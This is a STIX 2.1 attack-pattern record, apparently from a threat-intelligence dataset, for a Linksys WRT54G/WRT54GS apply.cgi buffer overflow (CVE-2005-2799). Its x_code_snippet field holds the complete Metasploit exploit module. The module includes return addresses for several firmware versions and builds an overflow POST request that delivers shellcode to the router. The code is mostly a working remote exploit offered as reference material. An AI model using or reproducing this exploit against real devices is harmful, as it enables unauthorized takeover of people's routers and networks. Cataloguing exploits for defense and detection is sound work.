{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1005e880-b2b0-443b-9fa6-249278fa0c8b",
    "created": "2024-08-14T17:01:01.776018Z",
    "modified": "2024-08-14T17:01:01.776022Z",
    "name": "Linksys WRT54 Access Point apply.cgi Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in apply.cgi on the Linksys WRT54G and WRT54GS routers. According to iDefense who discovered this vulnerability, all WRT54G versions prior to 4.20.7 and all WRT54GS version prior to 1.05.2 may be affected. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/linksys_apply_cgi.rb",
            "external_id": "linksys_apply_cgi.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-2799"
        },
        {
            "source_name": "reference",
            "url": "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=305"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Linksys WRT54 Access Point apply.cgi Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in apply.cgi on the Linksys WRT54G and WRT54GS routers.\n        According to iDefense who discovered this vulnerability, all WRT54G versions prior to\n        4.20.7 and all WRT54GS version prior to 1.05.2 may be affected.\n      },\n      'Author'         => [ 'Raphael Rigo <devel-metasploit[at]syscall.eu>', 'Julien Tinnes <julien[at]cr0.org>' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-2799'],\n          [ 'OSVDB', '19389' ],\n          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=305'],\n        ],\n      'Payload'        =>\n        {\n          #'BadChars' => \"\\x00\",\n          'Space'    => 10000,\n          'DisableNops' => true,\n        },\n      'Arch'\t\t => ARCH_MIPSLE,\n      'Platform'       => 'linux',\n      'Targets'        =>\n        [\n          # the middle of the intersection is our generic address\n          #((addrs.map { |n, h| [h[\"Bufaddr\"],n] }.max[0] + addrs.map { |n, h| [h[\"Bufaddr\"],n] }.min[0]+9500)/2).to_s(16)\n          [ 'Generic', { 'Bufaddr' => 0x10002b50}],\n          [ 'Version 1.42.2', { 'Bufaddr' => 0x100016a8 }],\n          [ 'Version 2.02.6beta1', { 'Bufaddr' => 0x10001760 }],\n          [ 'Version 2.02.7_ETSI', { 'Bufaddr' => 0x10001634 }],\n          [ 'Version 3.03.6', { 'Bufaddr' => 0x10001830 }],\n          [ 'Version 4.00.7', { 'Bufaddr' => 0x10001AD8 }],\n          [ 'Version 4.20.06', { 'Bufaddr' => 0x10001B50 }],\n        ],\n      'DisclosureDate' => '2005-09-13',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RHOST('192.168.1.1')\n      ])\n  end\n\n  # Approx size of the remaining space in the data segment after our buffer\n  DataSegSize = 0x4000\n\n  def exploit\n    c = connect\n\n    print_status(\"Return address at 0x#{target['Bufaddr'].to_s(16)}\")\n    print_status(\"Shellcode length: #{payload.encoded.length}\")\n\n    addr = [target['Bufaddr']].pack('V')\n\n#\t\toriginal = \"Cache-Control: no-cache\\r\\nPragma: no-cache\\r\\nExpires: 0\\x00\\x00\\x00\"\n#\t\toriginal += \"\\x10\\xAD\\x43\\x00\\x18\\xAD\\x43\\x00\\x70\\x3e\\x00\\x10\\x00\\x00\\x00\\x00\"\n#\t\t            Pointers in 2.02.6beta1\n\n\n#\t\t | BIG BUFFER  | Various structs and function pointers | ... | .ctors | .dtors | ... | .got |\n#\t\t | <- 10000 -> | **************************** Pad with return address ***********************\n#\t\t I know this is horrible :( - On the other side this is very generic :)\n    post_data = \"\\x00\"*(10000-payload.encoded.length)+payload.encoded+addr*(DataSegSize/4)\n\n    #post_data = \"\\x00\"*(10000-payload.encoded.length)+payload.encoded+original+addr*2#+\"\\x24\\xad\\x43\"\n\n#\t        res = send_request_cgi({ 'uri' => \"/apply.cgi\",\n#\t\t\t\t  'method' => 'POST',\n#\t\t\t\t  'data' => post_data });\n#\t\tprint_status(\"Malicious request sent, do_ej should be overwritten\")\n\n    req = c.request_cgi({ 'uri' => \"/apply.cgi\",\n      'method' => 'POST',\n      'data' => post_data\n    })\n    c.send_request(req)\n    print_status(\"Mayhem sent\")\n\n\n#\t\treq=c.request_cgi('uri' => '/');\n#\t\tc.send_request(req);\n#\t\tprint_status(\"do_ej triggered\")\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-09-13",
    "x_mitre_platforms": [
        "linux'"
    ]
}